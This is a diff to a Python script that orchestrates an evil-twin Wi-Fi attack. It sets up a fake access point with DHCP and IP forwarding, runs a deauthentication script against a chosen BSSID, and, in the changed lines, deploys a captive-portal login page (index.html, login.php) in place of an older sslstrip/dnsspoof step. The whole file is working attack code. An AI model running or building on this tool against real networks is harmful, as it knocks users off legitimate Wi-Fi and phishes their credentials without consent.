@@ -20,7 +20,7 @@ if __name__ == '__main__':
     os.system('iwconfig')
     time.sleep(5)
     ##------------------------ step 2 scan sets -----------------------------------------------------##
-    os.system("gnome-terminal -x python2 netStats.py")
+    os.system("gnome-terminal -x python2 helper_files/netStats.py")
     target_AP_name = input("enter the fake AP name")
     target_AP_BSSID = input("enter the fake AP BSSID")
     ##------------------------ step 3 create fake access point ---------------------------------------##
@@ -33,7 +33,7 @@ if __name__ == '__main__':
                                        "\nchannel=11\nmacaddr_acl=0\nignore_broadcast_ssid=0")
     f.close()
 
-    os.system("gnome-terminal -x python3 run_fake_net.py")
+    os.system("gnome-terminal -x python3 helper_files/run_fake_net.py")
     time.sleep(5)
     ##------------------------ step 4 DHCP server ---------------------------------------##
     dnsmasqPath = os.path.join('/root/fap', 'dnsmasq.conf')
@@ -48,7 +48,7 @@ if __name__ == '__main__':
     os.system('ifconfig ' + monitor_interface2 + ' up 192.168.1.1 netmask 255.255.255.0')
     os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
 
-    os.system("gnome-terminal -x python3 run_DHCP_server.py")
+    os.system("gnome-terminal -x python3 helper_files/run_DHCP_server.py")
 
     ##-------------------------------- step 5 iptables ---------------------------------------##
     os.system('iwconfig')
@@ -58,13 +58,12 @@ if __name__ == '__main__':
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
     ##------------------------ step 6 deauthentication ---------------------------------------##
-    os.system("gnome-terminal -x python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
-    # os.system("python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
+    os.system("gnome-terminal -x python3 helper_files/my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
 
-    ##------------------------ step 7 sslstrip attack ----------------------------------------##
-    # os.system("service apache2 start")
-    # os.system("dnsspoof -i wlan2 -f dnsspoof")
+    ##------------------------ step 7 captive portal ----------------------------------------##
+    os.system("cp login_page_files/index.html /var/www/html/")
+    os.system("cp login_page_files/login.php /var/www/html/")
 
-    #move get.php and index.html to the comp folder##########
+
     while True:
         time.sleep(5)
